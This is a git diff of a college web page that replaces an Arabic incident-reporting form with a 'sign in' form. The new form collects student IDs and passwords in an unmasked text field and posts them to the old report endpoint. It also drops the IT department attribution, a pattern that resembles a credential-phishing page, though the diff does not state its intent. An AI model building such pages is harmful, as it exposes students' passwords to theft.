@@ -3,35 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام بلاغات الكلية</title>
-    <style>
-        /* تنسيقات عامة */
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
-        
-        /* الهيدر والشعار */
-        header { background: #003366; color: white; padding: 1rem; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .logo-container img { max-width: 120px; height: auto; margin-bottom: 10px; border-radius: 8px; }
-
-        /* حاوية النموذج */
-        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .report-card { background: white; padding: 2.5rem; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 100%; max-width: 450px; }
-        
-        h2 { color: #003366; text-align: center; margin-top: 0; }
-        p.subtitle { text-align: center; color: #666; font-size: 0.9rem; margin-bottom: 20px; }
-
-        /* العناصر المدخلة */
-        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
-        input, select, textarea { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 1rem; }
-        textarea { resize: vertical; min-height: 100px; }
-
-        /* الأزرار */
-        button { width: 100%; padding: 12px; background-color: #e63946; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 1.1rem; font-weight: bold; transition: 0.3s; }
-        button:hover { background-color: #c1121f; }
-
-        /* الفوتر (Footer) */
-        footer { background: #222; color: #bbb; text-align: center; padding: 1.5rem; font-size: 0.85rem; margin-top: auto; }
-        footer a { color: #fff; text-decoration: none; margin: 0 10px; }
-    </style>
+    <title>sign in</title>
 </head>
 <body>
 
@@ -46,33 +18,24 @@
 
     <div class="container">
         <div class="report-card">
-            <h2>تقديم بلاغ جديد</h2>
-            <p class="subtitle">يرجى ملء البيانات أدناه لضمان سرعة المعالجة</p>
+            <h2>sign in</h2>
             
             <form action="/submit-report" method="POST">
-                <label>الاسم الكامل (اختياري):</label>
-                <input type="text" name="student_name" placeholder="أدخل اسمك">
+                <label> الرقم الجامعي </label>
+                <input type="text" name="student_id" placeholder="44******">
 
-                <label>نوع البلاغ:</label>
-                <select name="report_type" required>
-                    <option value="">-- اختر النوع --</option>
-                    <option value="maintenance">أعطال فنية/صيانة</option>
-                    <option value="academic">شكوى أكاديمية</option>
-                    <option value="security">أمن وسلامة</option>
-                    <option value="other">أخرى</option>
-                </select>
 
-                <label>وصف البلاغ:</label>
-                <textarea name="description" placeholder="اشرح تفاصيل البلاغ هنا..." required></textarea>
+                    <label> الرقم السري </label>
+                <input type="text" name="student_password" placeholder="*********">
 
-                <button type="submit">إرسال البلاغ</button>
+                <button type="submit">sign in</button>
             </form>
         </div>
     </div>
 
     <!-- الفوتر -->
     <footer>
-        <p>© 2024 جميع الحقوق محفوظة - عمادة تقنية المعلومات</p>
+        <p>© 2026 جميع الحقوق محفوظة </p>
         <div>
             <a href="#">سياسة الخصوصية</a> | 
             <a href="#">اتصل بنا</a> | 
